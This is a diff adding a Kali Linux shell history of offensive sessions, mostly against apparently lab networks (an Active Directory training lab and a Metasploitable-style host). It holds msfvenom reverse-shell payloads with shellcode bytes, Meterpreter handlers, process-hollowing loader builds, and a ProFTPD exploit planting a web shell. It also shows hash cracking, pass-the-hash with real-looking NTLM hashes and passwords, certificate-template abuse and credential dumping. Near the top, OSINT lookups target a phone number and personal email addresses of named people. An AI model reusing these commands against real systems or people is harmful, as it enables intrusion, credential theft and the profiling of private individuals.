@@ -1,0 +1,1654 @@
+--- HISTORIQUE DES COMMANDES ---
+ls
+sudo dpkg-reconfigure keyboard-configuration
+reboot
+ls
+cd 
+ls
+cd Desktop
+ls
+sudo host Alpha
+ls
+sudo hostname alpha
+ls
+cd 
+ls
+ip a
+nmap -o 192.168.80.
+nmap -o 192.168.80.0
+sudo shutdown
+sudo apt update
+ls
+rm 192.168.80.
+ls
+rm 192.168.80.0
+ls
+cd D
+cd Desktop
+ls
+mkdir dockali
+cd dockali
+ls
+ip a
+nmap 192.168.80.0 -O
+nmap 192.168.80.0 -sS
+nmap -v -A -sV 192.168.80.0
+nmap -sL 192.168.80.0
+rustcan -a 192.168.80.0
+nmap -Pn 192.168.80.0/24
+[200~nmap -Pn -sn 192.168.80.0/24
+nmap -Pn -sn 192.168.80.0/24
+nmap -Pn -sn 192.168.80.0/24\
+
+nmap -sn -PR 192.168.80.0/24\
+
+nmap -sn -PR 192.168.80.132/24\
+
+nmap -sn -PR 192.168.80.0/24\
+
+nmap -Pn 192.168.80.132\
+
+nmap -Pn -p 22 -sV 192.168.80.132\
+
+sudo ubuntu@192.168.80.132
+sudo ssh ubuntu@192.168.80.132
+ls
+nano aes.py
+nano xor.py
+python3 aes.py WET_TEAM.exe
+sudo apt install python3-pip
+python3 aes.py WET_TEAM.exe
+ls
+sudo apt update\
+sudo apt install -y python3-pycryptodome\
+
+python3 aes.py WET_TEAM.exe
+python3 -m pip install --user pycryptodome\
+
+sudo apt install -y python3-pip\
+
+python3 aes.py WET_TEAM.exe
+which python3\
+python3 -V\
+python3 -m pip -V\
+
+python3 aes.py WET_TEAM.exe
+sudo apt install -y python3-venv\
+python3 -m venv crypto-env\
+source crypto-env/bin/activate\
+
+pip install pycryptodome\
+
+python3 aes.py WET_TEAM.exe
+ls
+exit
+sliver-client
+ls
+cd Desktop
+ls
+sudo apt update
+sudo apt install sliver
+sliver-client version\
+
+scp ubuntu@IP_UBUNTU:/home/ubuntu/.sliver-client/configs/ubuntu_localhost.cfg .\
+
+scp ubuntu@192.168.80.132:/home/ubuntu/.sliver-client/configs/ubuntu_localhost.cfg .\
+
+sliver-client import ubuntu_localhost.cfg\
+
+sliver-client\
+
+ip a
+scp ubuntu@192.168.80.132:/home/ubuntu/kali_192.168.80.132.cfg .\
+
+sudo scp ubuntu@192.168.80.132:/home/ubuntu/kali_192.168.80.132.cfg .\
+
+sliver-client import kali_192.168.80.132.cfg\
+
+scp ubuntu@192.168.80.132:/home/ubuntu/kali_192.168.80.132.cfg .\
+
+sliver-client import kali_192.168.80.132.cfg
+sliver-client
+sliver-server
+ip a
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.80.131 LPORT=8080 EXITFUNC=thread -f csharp
+x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,
+0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x01,0xc3,
+0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,
+msfconsole -q
+phoneinfoga scan -n "+33767872939"
+sudo apt update\
+sudo apt install -y docker.io\
+sudo systemctl start docker\
+sudo systemctl enable docker\
+
+docker run --rm sundowndev/phoneinfoga scan -n "+33767872939"\
+
+sudo docker run --rm sundowndev/phoneinfoga scan -n "+33767872939"\
+
+Digest: sha256:b9c0eceea4048c7d8b0486d89bd9037193dc6fa38b8932794d4e9b751c28c655
+Status: Downloaded newer image for sundowndev/phoneinfoga:latest
+Running scan for phone number +33767872939...
+Results for googlesearch
+Social media:
+Disposable providers:
+sudo apt update\
+sudo apt install -y open-vm-tools open-vm-tools-desktop\
+sudo reboot\
+
+xfconf-query -c xsettings -p /Gtk/CursorThemeName -s Adwaita\
+xfconf-query -c xsettings -p /Gtk/CursorThemeSize -s 24\
+
+sudo apt update\
+sudo apt install -y adwaita-icon-theme\
+
+sudo update-alternatives --config x-cursor-theme\
+
+reboot
+sherlock
+sudo apt install sherlock -y
+ls
+cd Desktop
+ls
+cd exit
+cd ..
+ls
+python3 --version\
+
+git clone https://github.com/megadose/holehe.git\
+cd holehe\
+pip3 install -r requirements.txt
+sudo apt install -y python3-venv\
+
+source venv/bin/activate\
+
+python3 -m venv venv\
+
+ls
+cd holehe
+ls
+cd ..
+ls
+source venv/bin/activate\
+
+pip install -r requirements.txt\
+
+pip install .\
+
+holele lilo.bennardo@gmail.com
+holehe lilo.bennardo@gmail.com
+pip install requests\
+
+holehe lilo.bennardo@gmail.com
+ls
+holehe sclaparil@neuf.fr
+holehe calbennardo@gmail.com
+sherlock charly.bennardo
+clear
+ls
+rm charly.bennardo.txt
+ls
+clear
+ls
+exit
+ls
+cd process
+ls
+chmod +x build.sh && ./build.sh
+ls
+lsmsfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 8080; run"\
+
+msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 8080; run"\
+
+[200~msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.80.131; set LPORT 8080; run"
+msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.80.131; set LPORT 8080; run"
+[200~cd ProcessHollowing
+dotnet new console --force -o . > /dev/null 2>&1
+cp ../ProcessHollowing.cs Program.cs   # APRÃƒ¨S dotnet new
+dotnet publish ...
+[200~cd ~/process/ProcessHollowing
+cd ~/process/ProcessHollowing
+[200~cp ~/process/ProcessHollowing.cs Program.cs
+cp ~/process/ProcessHollowing.cs Program.cs
+dotnet publish -p:PublishSingleFile=true -r win-x64 -c Release --self-contained true -p:PublishTrimmed=true\
+
+cp $(find bin -name "ProcessHollowing.exe") ~/process/ProcessHollowing.exe\
+
+cp bin/Release/net6.0/win-x64/publish/ProcessHollowing.exe ~/process/ProcessHollowing.exe\
+
+msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.80.131; set LPORT 8080; run"
+ping 192.168.0.28
+ls
+mv /home/kali/shell.exe /home/kali/Downloads/text.exe
+cd /home/kali/Downloads
+ls
+build_loadthat.sh
+chmod +x build_loadthat.sh && ./build_loadthat.sh
+[200~sudo apt install mingw-w64 -y
+sudo apt install mingw-w64 -y
+./build_loadthat.sh\
+
+ls
+shutdown
+sudo apt update
+ls
+ip a
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.80.131 LPORT=4444 -f exe -o shell.exe
+ls
+[200~msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=peertube.lestutosdeprocessus.fr LPORT=8080 EXITFUNC=thread -f csharp
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.80.131 LPORT=8080 EXITFUNC=thread -f csharp
+x41,0xba,
+0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,
+0xce,0x75,0xe5,0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,
+0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,
+0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,
+0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,
+0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,
+0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,
+0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,
+0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,
+0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,
+0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,
+0x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,
+0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x01,0xc3,
+0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,
+0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,
+ls
+nano text.txt
+python3 -m http.server 8080
+pwd
+ls
+scp kali@192.168.80.131:/home/kali/text.txt C:\Users\WavyCorp\Desktop\\
+kali
+sudo service ssh start
+sudo service ssh startd
+ls
+cd Downloads
+ls
+build_loadthat.sh
+ip a
+ufw status
+ss -tlnp | grep 8080
+ping 172.28.128.3
+nmap -sV -sC 172.28.128.3
+nmap -sV --open -T4 172.28.128.3
+nmap -sS -T2 172.28.128.3
+ip a
+ping 192.168.0.12
+sudo dhclient eth0\
+ip a
+sudo dhcpcd eth0
+ip a
+sudo ip link set eth0 up\
+sudo systemctl restart NetworkManager\
+ip a
+sudo ip link set eth0 down\
+sudo ip link set eth0 up\
+sleep 3\
+ip a
+sudo systemctl restart NetworkManager\
+ip a
+sudo reboot
+ip a
+sudo systemctl restart NetworkManager\
+sleep 3\
+ip a
+sudo ip link set eth0 up\
+sudo ip addr add 192.168.0.50/24 dev eth0\
+sudo ip route add default via 192.168.0.1\
+ip a
+ping 192.168.0.12
+ip route
+sudo ip route add default via 192.168.0.1\
+ping 192.168.0.12
+sudo systemctl restart NetworkManager\
+ip a
+ip a
+ping 192.168.0.12
+nmap -sV -T4 192.168.0.12
+msfconsole\
+search proftpd\
+use exploit/unix/ftp/proftpd_modcopy_exec\
+set RHOSTS 192.168.0.12\
+set SITEPATH /var/www/html\
+run
+ip a
+john --show --format=md5crypt hashes.txt
+cat ~/.john/john.pot
+john --show --format=md5crypt hashes.txt
+cat > hashes_clean.txt << 'EOF'\
+leia_organa:$1$N6DIbGGZ$LpERCRfi8IXlNebhQuYLK/\
+luke_skywalker:$1$/7D550zb$Y/akb.UNrDS2w7nZVq.Ll/\
+han_solo:$1$6jIF3qTC$7jEXfQsNENuWYe06cK7m1.\
+darth_vader:$1$rLuMkR1R$YHumHRxhswnf07eTUUfHJ.\
+chewbacca:$1$.qt4t8zH$RdKbdafuqc7rYiDXSoQCI.\
+EOF\
+\
+john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes_clean.txt
+curl "http://192.168.0.12/zHP6PHS.php"
+curl "http://192.168.0.12/zHP6PHS.php?cmd=id"
+nc -lvnp 4444
+sudo ip route add 192.168.0.0/24 via 192.168.80.2
+ping 192.168.0.12
+# Sauvegarde les hashes\
+echo 'vagrant:$6$NABMNgxO$T2lvEhArj0ImjvROySq8vka/r8MWhhzNgT3Z5FS1LcPS5D325ESK5LjFJymb2jo/m4NmDg8aEl0TWWI3la.Y3/' > hashes.txt\
+echo 'leia_organa:$1$N6DIbGGZ$LpERCRfi8IXlNebhQuYLK/' >> hashes.txt\
+echo 'luke_skywalker:$1$/7D550zb$Y/akb.UNrDS2w7nZVq.Ll/' >> hashes.txt\
+\
+# Craque avec rockyou\
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz\
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\
+john --show hashes.txt
+cat >> hashes.txt << 'EOF'\
+han_solo:$1$6jIF3qTC$7jEXfQsNENuWYe06cK7m1.\
+artoo_detoo:$1$tfvzyRnv$mawnXAR4GgABt8rtn7Dfv.\
+c_three_pio:$1$1Xx7tKuo$xuM4AxkByTUD78BaJdYdG.\
+ben_kenobi:$1$5nfRD/bA$y7ZZD0NimJTbX9FtvhHJX1\
+darth_vader:$1$rLuMkR1R$YHumHRxhswnf07eTUUfHJ.\
+anakin_skywalker:$1$jlpeszLc$PW4IPiuLTwiSH5YaTlRaB0\
+jarjar_binks:$1$SNokFi0c$F.SvjZQjYRSuoBuobRWMh1\
+lando_calrissian:$1$Af1ek3xT$nKc8jkJ30gMQWeW/6.ono0\
+boba_fett:$1$TjxlmV4j$k/rG1vb4.pj.z0yFWJ.ZD0\
+jabba_hutt:$1$9rpNcs3v$//v2ltj5MYhfUOHYVAzjD/\
+greedo:$1$vOU.f3Tj$tsgBZJbBS4JwtchsRUW0a1\
+chewbacca:$1$.qt4t8zH$RdKbdafuqc7rYiDXSoQCI.\
+kylo_ren:$1$rpvxsssI$hOBC/qL92d0GgmD/uSELx.\
+EOF
+john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+use exploit/unix/ftp/proftpd_modcopy_exec\
+set RHOSTS 192.168.0.12\
+set SITEPATH /var/www/html\
+set payload cmd/unix/bind_netcat\
+set LHOST 192.168.80.131\
+run
+ip a
+msfconsole
+curl "http://192.168.0.12/zHP6PHS.php?0=whoami"
+ip a
+sudo ip route add 192.168.0.0/24 via 192.168.80.2\
+ping 192.168.0.12
+# Sur Kali - terminal sÃ©parÃ©\
+cd /tmp\
+wget https://github.com/berdav/CVE-2021-4034/archive/main.zip\
+unzip main.zip\
+cd CVE-2021-4034-main\
+python3 -m http.server 8000
+ls
+ipconfig
+ip a
+nmap -sV -T4 192.168.0.0/24
+nmap -sS -T2 -p- --open 192.168.0.0/24
+nmap -sS -T2 -F --open 192.168.0.0/24
+ip a
+ip q
+ip a
+sudo dhclient eth0
+sudo dhcpcd eth0
+ip a
+sudo systemctl restart NetworkManager\
+sleep 3\
+ip a
+nmap -sS -T4 -F --open 192.168.253.0/24
+nmap -sn 192.168.253.0/24
+sudo apt update
+ip 
+ip a
+# VÃ©rifier que eth1 a une IP\
+ip a\
+\
+# Relancer apt\
+sudo apt update
+sudo apt install -y \\
+  nmap masscan netdiscover \\
+  smbclient smbmap \\
+  ldap-utils \\
+  bloodhound neo4j \\
+  responder \\
+  john hashcat \\
+  exiftool \\
+  dnsenum dnsrecon \\
+  wine
+for tool in nmap masscan netdiscover smbclient smbmap ldapsearch bloodhound neo4j responder john hashcat exiftool dnsenum dnsrecon wine; do\
+  if command -v $tool &>/dev/null; then\
+    echo "âƒ¼ƒ³ $tool"\
+  else\
+    echo "âƒ¼ƒ· $tool â€ƒ´ NON INSTALLÃƒ©"\
+  fi\
+done
+pipx install certipy-ad
+# Ãƒ©tape 1 â€ƒ´ dÃ©pendances (depuis HELP.md officiel)\
+sudo apt-get -y install gcc clang libclang-dev libgssapi-krb5-2 libkrb5-dev libsasl2-modules-gssapi-mit musl-tools gcc-mingw-w64-x86-64\
+\
+# Ãƒ©tape 2 â€ƒ´ Rust/Cargo si absent\
+curl https://sh.rustup.rs -sSf | sh\
+source ~/.cargo/env\
+\
+# Ãƒ©tape 3 â€ƒ´ install\
+cargo install rusthound-ce\
+\
+# VÃ©rification\
+rusthound-ce --help
+sudo apt install bloodhound-ce-python -y
+sudo apt install crackmapexec -y
+gem install evil-winrm
+echo "=== RECON ===" && \\
+for tool in nmap masscan netdiscover dnsenum dnsrecon; do command -v $tool &>/dev/null && echo "âƒ¼ƒ³ $tool" || echo "âƒ¼ƒ· $tool"; done && \\
+\
+echo "=== SMB/LDAP ===" && \\
+for tool in smbclient smbmap ldapsearch rpcclient enum4linux; do command -v $tool &>/dev/null && echo "âƒ¼ƒ³ $tool" || echo "âƒ¼ƒ· $tool"; done && \\
+\
+echo "=== KERBEROS/AD ===" && \\
+for tool in kerbrute impacket-GetNPUsers impacket-secretsdump impacket-GetUserSPNs bloodhound-ce-python rusthound-ce; do command -v $tool &>/dev/null && echo "âƒ¼ƒ³ $tool" || echo "âƒ¼ƒ· $tool"; done && \\
+\
+echo "=== EXPLOIT ===" && \\
+for tool in msfconsole responder evil-winrm crackmapexec certipy; do command -v $tool &>/dev/null && echo "âƒ¼ƒ³ $tool" || echo "âƒ¼ƒ· $tool"; done && \\
+\
+echo "=== POST EXPLOIT ===" && \\
+for tool in bloodhound neo4j john hashcat exiftool wine; do command -v $tool &>/dev/null && echo "âƒ¼ƒ³ $tool" || echo "âƒ¼ƒ· $tool"; done && \\
+\
+echo "=== PEASS ===" && \\
+ls ~/pentest/06_loot/linpeas.sh ~/pentest/06_loot/winPEASx64.exe 2>/dev/null && echo "âƒ¼ƒ³ linpeas/winpeas" || echo "âƒ¼ƒ· linpeas/winpeas"
+pipx install enum4linux-ng
+git clone https://github.com/cddmp/enum4linux-ng.git\
+cd enum4linux-ng\
+pip install -r requirements.txt --break-system-packages\
+sudo cp enum4linux-ng.py /usr/local/bin/enum4linux-ng\
+chmod +x /usr/local/bin/enum4linux-ng
+# VÃ©rification\
+enum4linux-ng --help
+sudo chmod +x /usr/local/bin/enum4linux-ng\
+enum4linux-ng --help
+wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O kerbrute\
+chmod +x kerbrute && sudo mv kerbrute /usr/local/bin/
+mkdir -p ~/pentest/06_loot\
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O ~/pentest/06_loot/linpeas.sh\
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -O ~/pentest/06_loot/winPEASx64.exe\
+chmod +x ~/pentest/06_loot/linpeas.sh
+echo "=== RECON ===" && \\
+for tool in nmap masscan netdiscover dnsenum dnsrecon; do command -v $tool &>/dev/null && echo "âƒ¼ƒ³ $tool" || echo "âƒ¼ƒ· $tool"; done && \\
+echo "=== SMB/LDAP ===" && \\
+for tool in smbclient smbmap ldapsearch rpcclient enum4linux-ng; do command -v $tool &>/dev/null && echo "âƒ¼ƒ³ $tool" || echo "âƒ¼ƒ· $tool"; done && \\
+echo "=== KERBEROS/AD ===" && \\
+for tool in kerbrute impacket-GetNPUsers impacket-secretsdump impacket-GetUserSPNs bloodhound-ce-python rusthound-ce; do command -v $tool &>/dev/null && echo "âƒ¼ƒ³ $tool" || echo "âƒ¼ƒ· $tool"; done && \\
+echo "=== EXPLOIT ===" && \\
+for tool in msfconsole responder evil-winrm crackmapexec certipy; do command -v $tool &>/dev/null && echo "âƒ¼ƒ³ $tool" || echo "âƒ¼ƒ· $tool"; done && \\
+echo "=== POST EXPLOIT ===" && \\
+for tool in bloodhound neo4j john hashcat exiftool wine; do command -v $tool &>/dev/null && echo "âƒ¼ƒ³ $tool" || echo "âƒ¼ƒ· $tool"; done && \\
+echo "=== PEASS ===" && \\
+ls ~/pentest/06_loot/linpeas.sh ~/pentest/06_loot/winPEASx64.exe 2>/dev/null && echo "âƒ¼ƒ³ linpeas/winpeas" || echo "âƒ¼ƒ· linpeas/winpeas"
+# winPEASx64.exe manquant\
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -O ~/pentest/06_loot/winPEASx64.exe
+ls
+pw
+pwd
+cd ..
+l
+ls
+mkdir vpn
+cd vpn
+ls
+cd ..
+ls
+cd vpn
+# Connexion VPN\
+sudo openvpn ~/lilo.ovpn
+# VÃ©rifie oÃ¹ est le fichier\
+find / -name "*.ovpn" 2>/dev/null\
+\
+# Puis connecte avec le bon chemin\
+sudo openvpn /chemin/vers/lilo.ovpn
+find / -name "*.ovpn" 2>/dev/null
+sudo openvpn /home/kali/vpn/lilo.ovpn\
+
+cd ..
+ls
+cd Desktop
+mkdir lab GOAD
+ls
+cd GOAD
+nano recon.txt
+ls
+cd D
+cd Desktop
+cd GOAD
+ls
+python3 -m http.server 8080
+sudo apt install open-vm-tools -y
+ls /mnt/hgfs
+sudo apt install open-vm-tools open-vm-tools-desktop -y
+sudo vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other
+\
+
+ip a show tun0
+nmap -sn 192.168.56.0/24
+ping -c2 192.168.56.10 192.168.56.11 192.168.56.22 192.168.56.100
+sudo nmap -T4 -F -O 192.168.56.10 192.168.56.11 192.168.56.22 192.168.56.100 -oN ~/pentest/scans/goad_fast.txt
+nmap -sn 192.168.56.0/24
+nmap -T5 192.168.56.0/24
+map scan report for 192.168.56.10
+Host is up (0.020s latency).
+Not shown: 985 closed tcp ports (reset)
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+3389/tcp open  ms-wbt-server
+5985/tcp open  wsman
+5986/tcp open  wsmans
+Nmap scan report for 192.168.56.11
+Host is up (0.019s latency).
+Not shown: 986 closed tcp ports (reset)
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+3389/tcp open  ms-wbt-server
+5985/tcp open  wsman
+5986/tcp open  wsmans
+netexec
+nmap -T5 -sS -sV -O 192.168.56.0/24
+sudo apt install open-vm-tools open-vm-tools-desktop -y
+reboot
+nxc smb 192.168.56.10 -u 'Administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' -d sevenkingdoms.local -M certipy
+nxc smb 192.168.56.11 -u 'Administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' --ntds
+nxc smb 192.168.56.10 -u 'robb.stark' -H '831486ac7f26860c9e2f51ac91e1a07a' -d sevenkingdoms.local
+nxc smb 192.168.56.10 -u 'Administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' -d sevenkingdoms.local
+nxc smb 192.168.56.10 -u 'Administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' -d north.sevenkingdoms.local -M certipy
+nxc smb 192.168.56.10 -u 'Administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' -d north.sevenkingdoms.local -M adcs
+nxc ldap 192.168.56.10 -u 'Administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' -d north.sevenkingdoms.local -M adcs
+nxc ldap 192.168.56.10 -u 'Administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' -d north.sevenkingdoms.local -M adcs --options
+certipy req -u 'Administrator' -hashes ':dbd13e1c4e338284ac4e9874f7de6ef4' -target 192.168.56.10 -ca SEVENKINGDOMS-CA -template <NOM_DU_TEMPLATE_VULNÃƒ©RABLE> -upn administrator@sevenkingdoms.local
+certipy find -u 'Administrator' -hashes ':dbd13e1c4e338284ac4e9874f7de6ef4' -target 192.168.56.10 -vulnerable -stdout
+certipy find -u 'Administrator' -hashes ':dbd13e1c4e338284ac4e9874f7de6ef4' -d north.sevenkingdoms.local -target 192.168.56.10 -vulnerable -stdout
+certipy find -u 'Administrator@north.sevenkingdoms.local' -hashes ':dbd13e1c4e338284ac4e9874f7de6ef4' -target 192.168.56.10 -vulnerable -stdout
+nano certipy01.txt
+certipy req -u 'Administrator@north.sevenkingdoms.local' -hashes ':dbd13e1c4e338284ac4e9874f7de6ef4' -target 192.168.56.10 -ca SEVENKINGDOMS-CA -template ESC1 -upn administrator@sevenkingdoms.local
+certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10
+certipy req -u 'brandonsnow@sevenkingdoms.local' -p 'mot_depasse' -target 192.168.56.10 -ca SEVENKINGDOMS-CA -template ESC1 -upn administrator@sevenkingdoms.local
+sudo sh -c "echo '192.168.56.10 sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding' >> /etc/hosts"
+certipy req -u 'brandonsnow@sevenkingdoms.local' -p 'Password123!' -target 192.168.56.10 -ca SEVENKINGDOMS-CA -template ESC1 -upn administrator@sevenkingdoms.local -dc-ip 192.168.56.10
+certipy req -u 'brandonsnow@sevenkingdoms.local' -p 'iseedeadpeople' -target 192.168.56.10 -ca SEVENKINGDOMS-CA -template ESC1 -upn administrator@sevenkingdoms.local -dc-ip 192.168.56.10
+certipy req -u 'brandonsnow@sevenkingdoms.local' -hashes ':64fbae31cc352fc264104d4587bb3627' -target 192.168.56.10 -ca SEVENKINGDOMS-CA -template ESC1 -upn administrator@sevenkingdoms.local -dc-ip 192.168.56.10
+impacket-ntlmrelayx -t http://192.168.56.10/certsrv/certfnsh.asp -smb2support --adcs --template ESC1
+./chisel server -p 8000 --reverse
+which chisel\
+# ou \
+find /usr/bin /usr/share -name "chisel" 2>/dev/null
+certipy req -u 'robb.stark@sevenkingdoms.local' -hashes ':HASH_DE_ROBB' -target kingslanding.sevenkingdoms.local -ca SEVENKINGDOMS-CA -template ESC1 -upn administrator@sevenkingdoms.local
+nano analyse.txt
+nxc smb 192.168.56.11 -u 'sql_svc' -p 'iknownothing'
+nxc smb 192.168.56.11 -u 'sql_svc' -p 'iknownothing' --sam --lsa
+nxc smb 192.168.56.11 -u 'sql_svc' -p 'iknownothing' -d north.sevenkingdoms.local
+john ~/Desktop/GOAD/hashes.kerberoast --show
+nxc smb 192.168.56.11 -u 'sansa.stark' -p 'iknownothing' -d north.sevenkingdoms.local
+nxc smb 192.168.56.0/24 -u 'sansa.stark' -p 'iknownothing' -d north.sevenkingdoms.local
+bloodhound-python -u 'jeor.mormont' -p '_L0ngCl@w_' -d north.sevenkingdoms.local -dc WINTERFELL -c All
+bloodhound-ce-python -d north.sevenkingdoms.local \\
+-u brandon.stark -p iseedeadpeople \\
+-dc 192.168.56.11 -ns 192.168.56.11 \\
+-c all --zip
+nxc smb 192.168.56.11 -u 'Administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' -d north.sevenkingdoms.local
+evil-winrm -i 192.168.56.11 -u 'Administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4'
+nano recon02.txt
+ls
+nano enum.txt
+ls
+nano smbclient.txt
+nano exploit.txt
+cp ~/Desktop/GOAD/exploit.txt /mnt/hgfs/fichierpartageKali/
+netexec smb 192.168.56.22 -u jeor.mormont -p '_L0ngCl@w_' --sam
+netexec smb 192.168.56.22 -u jeor.mormont -p '_L0ngCl@w_' --lsa
+SamLsa.txt
+nano SamLsa.txt
+cp ~/Desktop/GOAD/SamLsa.txt /mnt/hgfs/fichierpartageKali/
+netexec smb 192.168.56.10 192.168.56.11 192.168.56.22 -u sql_svc -p 'YouWillNotKerboroast1ngMeeeeee'
+netexec smb 192.168.56.22 \ -u Administrator \ -H dbd13e1c4e338284ac4e9874f7de6ef4 \ --local-auth
+netexec mssql 192.168.56.22  -u sql_svc -p 'YouWillNotKerboroast1ngMeeeeee'
+netexec mssql 192.168.56.22 -u sql_svc -p 'YouWillNotKerboroast1ngMeeeeee' -x "whoami"
+netexec mssql 192.168.56.22 -u sql_svc -p 'YouWillNotKerboroast1ngMeeeeee' -x "whoami /priv"
+netexec mssql 192.168.56.22 -u sql_svc -p 'YouWillNotKerboroast1ngMeeeeee' -x "whoami /all"
+nano mssql.txt
+cp ~/Desktop/GOAD/mssql.txt /mnt/hgfs/fichierpartageKali/
+wget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe \\
+-O ~/Desktop/GOAD/GodPotato.exe
+nano godpatato.txt
+cp ~/Desktop/GOAD/godpatato.txt /mnt/hgfs/fichierpartageKali/
+netexec winrm 192.168.56.11 -u sql_svc -p 'YouWillNotKerboroast1ngMeeeeee'
+netexec smb 192.168.56.11 \\
+-u Administrator \\
+-H dbd13e1c4e338284ac4e9874f7de6ef4 \\
+--local-auth
+hashcat -m 2100 '$DCC2$10240#robb.stark#f19bfb9b10ba923f2e28b733e5dd1405' \\
+/usr/share/wordlists/rockyou.txt
+cp ~/Desktop/GOAD/analyse.txt /mnt/hgfs/fichierpartageKali/
+impacket-GetUserSPNs -request \\
+-outputfile ~/Desktop/GOAD/hashes.kerberoast \\
+-dc-ip 192.168.56.11 \\
+north.sevenkingdoms.local/brandon.stark:iseedeadpeople
+cat ~/Desktop/GOAD/hashes.kerberoast
+john ~/Desktop/GOAD/hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt
+john ~/Desktop/GOAD/hashes.kerberoast --show
+nano exploitServer11.txt
+cp ~/Desktop/GOAD/exploitServer11.txt /mnt/hgfs/fichierpartageKali/
+sudo nano /etc/hosts
+bloodhound-python -u 'jeor.mormont' -p '_L0ngCl@w_' -d north.sevenkingdoms.local \\
+-dc WINTERFELL.north.sevenkingdoms.local -ns 192.168.56.11 -c All --zip
+nxc smb 192.168.56.22 -u 'jeor.mormont' -p '_L0ngCl@w_' -d north.sevenkingdoms.local --sam --lsa
+nxc smb 192.168.56.11 -u 'sql_svc' -p 'YouWillNotKerboroast1ngMeeeeee' -d north.sevenkingdoms.local
+nxc mssql 192.168.56.22 -u 'sql_svc' -p 'YouWillNotKerboroast1ngMeeeeee' -d north.sevenkingdoms.local --xcmd 'whoami'
+nxc smb 192.168.56.11 -u 'sql_svc' -p 'YouWillNotKerboroast1ngMeeeeee' -d north.sevenkingdoms.local --shares
+nxc winrm 192.168.56.11 -u 'sql_svc' -p 'YouWillNotKerboroast1ngMeeeeee' -d north.sevenkingdoms.local
+nxc smb 192.168.56.22 -u 'jeor.mormont' -p '_L0ngCl@w_' -d north.sevenkingdoms.local --lsass
+nano pivot.txt
+cp ~/Desktop/GOAD/pivot.txt /mnt/hgfs/fichierpartageKali/
